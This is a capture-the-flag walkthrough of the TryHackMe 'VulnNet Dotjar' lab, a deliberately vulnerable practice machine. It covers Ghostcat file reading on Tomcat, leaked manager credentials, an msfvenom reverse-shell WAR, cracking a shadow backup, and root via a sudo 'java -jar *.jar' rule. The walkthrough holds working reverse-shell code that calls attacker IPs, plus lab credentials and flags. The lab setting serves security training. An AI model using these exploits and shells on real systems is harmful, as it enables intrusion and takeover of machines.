# Tryhackme.com Room : Vulnet Dotjar

`https://tryhackme.com/room/vulnnetdotjar

## Instance

```bash
export IP="10.10.65.140"
```

## Nmap

```
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
```

## Initial Foothold

We got tomcat running on port `8080`

`Apache Jserv` is some kind of proxy to serve static content apparently



Looking around, this might be related to the `ghostcat` vulnerability which can be used for local file inclusion



Let's try the exploit file at `https://github.com/00theway/Ghostcat-CNVD-2020-10487`



Using `ajpShooter.py` :

```bash
python3 ajpShooter.py http://10.10.65.140 8009  /WEB-INF/web.xml read
```

We retrieve this file :

```
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory

1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:

    webdev:Hgj3LA$02D$Fa@21

GUI access is disabled for security reasons.

4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
```

We get some credentials :

```
webdev:Hgj3LA$02D$Fa@21
```

We can;t access `:8080/manager` with these credentials. Might just be that the GUI is disabled, as mentionned in the `web.xml` file.



We have access to the `Virtual Host Manager` at `:8080/host-manager`. Not sure it's really useful.



Found the python package `tomcatmanager`.

Once installed, we can access the `:8080/manager` 

For some reason it didn't work when I use this syntax, I get an unauthorized access :

```
tomcat-manager --user=webdev --password=Hgj3LA$02D$Fa@21 http://10.10.205.16:8080/manager deploy local shell.war /shell
```



But if I dont specify the `--password` argument and enter it manually when prompted, it work



Had to go in interactive mode by running :

```
>> tomcat-manager
>>> connect http://10.10.65.140:8080/manager webdev
>>> list
```

Then i created a revshell `war` payload using `msfvenom` :

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.2.13.34 LPORT=6666 -f war >shell.war
```



And deployed it using the interactive `tomcat-manager` shell :

```
>>> deploy local shell.war /shell
```

Then accessing `:8080/shell` got us a connection.

And we are in !



We are logged in as `web` user, we need to reach `jdk-admin` to retrieve `user.txt`

We can't run `sudo -l` since we don't have the password for the `web` user



Doesn't seem like there is any process running as `jdk-admin`

nothing in `/opt`

No `cron` jobs

no special `setuid` binaries

no files owned by `jdk-admin`



Hmmm... let's run `linpeas`.. didn't find much



Soo, after looking around for a while, i deciced to check a write up to look for an hint. I quickly glanced the write up and saw a mention of a `backup` file.

Let's look for that.



We find `/var/backups/shadow-backup-alt.gz` for which we have read access



So this is a backup of `/etc/shadow`

Let's crack it with `john the ripper`

First we retrieve `/etc/passwd` then we `unshadow passwd shadow-backup-alt > tocrack`

Then we crack the password with `john --wordlist=/usr/share/wordlist/rockyou.txt tocrack`

We find 

```
jdk-admin:794613852
```

And we got `/home/jdk-admin/user.txt` :

```
THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```

## Priv esc

As `jdk-admin` user, we run `sudo -l` and get

```
User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
```



So i guess we can craft a jar file

OR

we could use the wildcard expansion to inject some parameters ?



Let's craft an hello world executable `jar` 

We create a `Manifest.txt` file with this one line:

```
Main-Class: Pwn.Main
```



We create a folder named `Pwn` in which we ass `Main.java` :

```java
package Pwn;

public class Main
{
    public static void main(String[] args)
    {
        System.out.println("Hello world");
    }
}
```



We compile the file with `javac Pwn/Main.java`

Then we create the `jar` with `jar cmvf Manifest.txt pwn.jar Pwn/Main.class`

We now got an executable jar that can be runned via `java -jar pwn.jar` 



Now, let's add a reverse shell payload to `Pwn/Main.java`

```java
package Pwn;

public class Main
{
    public static void main(String[] args)
    {
        System.out.println("Starting revshell");
        try {
        	Runtime r = Runtime.getRuntime();
            Process p = r.exec("/bin/sh -c '/bin/bash -i >& /dev/tcp/10.6.32.20/8080 0>&1'");
            p.waitFor();    
        } catch (Exception e){
            
        }
        
    }
}
```

We can compile the `jar` on our machine and send it to the machine.

Wellll, this is not working apparently, our java version is higher than the one on the box, so let's just compile it over there.



Hmmm, the jar file is runned but somehow we don't get shell command execution...

Soo, we ended up calling a script from the java file :

```java
package Pwn;

public class Main
{
    public static void main(String[] args)
    {
        System.out.println("Starting revshell");
        try {
                Runtime r = Runtime.getRuntime();
            Process p = r.exec("/bin/sh /tmp/pwned.sh");
            p.waitFor();
            System.out.println("runned");
        } catch (Exception e){

            System.out.println("EXCEPTION");
        }

    }
}
```



And `/tmp/pwned.sh` contains :

```bash
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.32.20",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



Then we call the `jar`  file using :

```
sudo /usr/bin/java -jar *.jar
```



And we got root.

`/root/root.txt`:

```
THM{464c29e3ffae05c2e67e6f0c5064759c}
```



## Follow up

Oh well, looking at some writeups, I could have used `msfvenom` to create a jar reverse shell payload.

Anyways, guess we learned more by crafting the file ourselves.



We could have also used java code to read the `/root/root.txt` file

Or add a line to `/etc/sudoers` or even created a new user

## End

